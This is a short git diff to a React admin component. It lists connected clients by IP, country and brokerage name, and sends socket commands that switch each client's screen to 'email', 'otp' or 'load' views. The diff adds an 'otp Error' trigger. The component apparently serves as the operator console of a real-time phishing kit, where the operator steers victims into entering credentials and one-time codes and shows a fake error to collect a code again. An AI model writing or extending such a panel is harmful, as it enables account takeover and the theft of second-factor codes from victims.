@@ -70,9 +70,15 @@ export default function Adm({ip,socket}) {
 
   const handleSubmit = (ipTable) => (event) => {
     event.preventDefault();
-    const elemento = document.activeElement.id;
+    let elemento = document.activeElement.id;
     console.log("Botão clicado:", elemento, "IP:", ipTable);
-    socket.emit("ComandoTroqueCena", { ipCliente: ipTable, cenaNova:elemento, msg });
+    let mostraErro =false;
+
+    if(elemento==="otp_Error"){
+      mostraErro =true;
+    }
+
+    socket.emit("ComandoTroqueCena", { ipCliente: ipTable, cenaNova:elemento, msg, mostraErro });
   };
 
   const handleChange = (event) => {
@@ -106,8 +112,8 @@ export default function Adm({ip,socket}) {
             ) => (
               <tr key={index} className="thM">
                                 <td>
-  <span className={`status-bullet ${item.online ? 'status-online' : 'status-offline'}`}></span>
-</td>
+              <span className={`status-bullet ${item.online ? 'status-online' : 'status-offline'}`}></span>
+            </td>
                 <td>{item.corretora}</td>
                 <td>{item.ip}</td>
                 <td>{item.countryCode}</td>
@@ -126,6 +132,7 @@ export default function Adm({ip,socket}) {
                   <form onSubmit={handleSubmit(item.ip)}  > 
                       <button className="btn btn-primary btn-sm teste" type="submit" id="email">email</button>
                       <button className="btn btn-secondary btn-sm teste" type="submit" id="otp">otp</button>
+                      <button className="btn btn-secondary btn-sm teste" type="submit" id="otp_Error">otp Error</button>
                       <button className="btn btn-primary btn-sm teste" type="submit" id="load">load</button>
                       
                       <div className="nav-links__item nav-dropdown">
